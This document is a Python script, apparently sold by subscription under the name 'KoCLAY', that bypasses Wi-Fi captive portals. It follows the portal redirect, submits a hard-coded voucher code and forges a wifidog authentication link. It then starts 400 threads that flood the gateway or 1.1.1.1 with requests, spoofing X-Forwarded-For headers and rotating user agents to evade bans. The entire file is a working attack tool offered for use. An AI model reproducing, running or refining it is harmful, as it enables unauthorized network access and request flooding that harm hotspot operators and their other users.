import requests, re, urllib3, time, threading, os, random, subprocess, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIG ---
PRIMARY_URL = "https://raw.githubusercontent.com/painglintun895-rgb/my-keys/refs/heads/main/vips.txt"
THREAD_COUNT = 400 

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a232"

def check_access():
    uid = get_uid()
    # ဖုန်းအချိန် နောက်ဆုတ်ခိုးသုံးတာ တားဖို့ Server Time ယူခြင်း
    try:
        r_t = requests.get("http://worldtimeapi.org/api/timezone/Asia/Yangon", timeout=5)
        now = datetime.strptime(r_t.json()['datetime'][:10], '%Y-%m-%d')
    except:
        now = datetime.now() # အင်တာနက်မရသေးခင် ဖုန်းအချိန်ကို ယာယီသုံးမယ်

    try:
        res = requests.get(f"{PRIMARY_URL}?t={random.random()}", timeout=10, verify=False)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if uid in line:
                    p = line.split('|')
                    v_name, v_exp = p[1].strip(), p[2].strip()
                    exp_dt = datetime.strptime(v_exp, '%Y-%m-%d')
                    
                    # ရက်ကို Server အချိန်နဲ့ တိုက်စစ်ခြင်း
                    diff = (exp_dt - now).days
                    if diff < 0:
                        banner(v_name, v_exp, "0", "\033[91m")
                        print("\033[91m[!] Subscription Expired. Please Renew.\033[0m")
                        sys.exit()
                    
                    banner(v_name, v_exp, str(diff + 1))
                    return True
            banner()
            sys.exit()
    except: return True 

def banner(name="GUEST", exp="Checking...", days="--", col="\033[92m"):
    os.system('clear')
    print("\033[93m" + " ="*38)
    print("\033[96m" + """
     ██╗  ██╗ ██████╗  ██████╗██╗      █████╗ ██╗   ██╗
     ██║ ██╔╝██╔═══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝
     █████╔╝ ██║   ██║██║     ██║     ███████║ ╚████╔╝ 
     ██╔═██╗ ██║   ██║██║     ██║     ██╔══██║  ╚██╔╝  
     ██║  ██╗╚██████╔╝╚██████╗███████╗██║  ██║   ██║   
     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   """)
    print(f"\033[95m 👑 MASTER: {name} | ID: {get_uid()}")
    print(f"\033[92m 📅 EXP: {exp} | ⏳ REMAINING: {days} Days")
    print(f"\033[93m ="*7 + f" [ {col}HEAT-CONTROL & ANTI-BAN ACTIVE\033[93m ] " + "="*8)
    print("\033[0m")

def power_pulse(link):
    uas = [
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X)"
    ]
    while True:
        headers = {
            "User-Agent": random.choice(uas),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }
        try:
            start = time.time()
            requests.get(link, timeout=3, verify=False, headers=headers)
            ms = int((time.time() - start) * 1000)
            color = "\033[92m" if ms < 150 else "\033[91m"
            print(f"\033[92m[✓] 👑 KoＣＬＡＹ 👑 | Turbo Mode >>> {color}[{ms}ms]\033[0m")
            time.sleep(0.005) 
        except: time.sleep(0.2)

def launch():
    session = requests.Session()
    while True:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            if r.status_code == 204:
                print("\033[92m[!] Bypass Successful! Boosting Maximum Speed...\033[0m")
                for _ in range(THREAD_COUNT):
                    threading.Thread(target=power_pulse, args=("https://1.1.1.1",), daemon=True).start()
                while True: time.sleep(10)

            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=6)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            r2 = session.get(n_url, verify=False, timeout=6)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                gw = parse_qs(urlparse(p_url).query).get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                print(f"\033[95m[*] ⚡ Master Session Active. Deploying {THREAD_COUNT} Threads... ⚡\033[0m")
                for _ in range(THREAD_COUNT):
                    threading.Thread(target=power_pulse, args=(auth_link,), daemon=True).start()
                while True:
                    time.sleep(5)
                    if requests.get("http://google.com", timeout=5).status_code > 400: break
            else: time.sleep(2)
        except: time.sleep(3)

if __name__ == "__main__":
    try:
        if check_access(): launch()
    except KeyboardInterrupt: os._exit(0)
